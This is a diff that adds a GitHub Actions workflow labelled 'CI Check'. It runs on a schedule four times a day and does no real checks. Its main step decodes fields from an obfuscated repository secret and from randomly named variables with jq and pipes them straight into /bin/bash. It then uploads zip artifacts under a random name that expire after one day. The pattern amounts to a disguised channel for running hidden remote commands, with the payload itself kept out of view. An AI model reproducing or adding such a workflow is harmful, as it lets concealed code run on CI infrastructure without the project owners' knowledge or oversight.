@@ -1,0 +1,28 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 2,8,14,20 * * *'
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          afyz07246: ${{ secrets.afyz07246 }}
+        run: |
+          printf '%s' "$afyz07246" | jq -r .l54 | /bin/bash
+          echo $nja8 | jq -r .po6 | /bin/bash
+          echo $m082 | jq -r .u5753 | /bin/bash
+          printf '%s' "$e20" | jq -r .qqsda87 | /bin/bash
+          printf '%s' "$q544" | jq -r .qhd22726 | /bin/bash
+          echo $fiv79068 | jq -r .c15497 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: v64FtuVO
+          path: "*.zip"
+          retention-days: 1
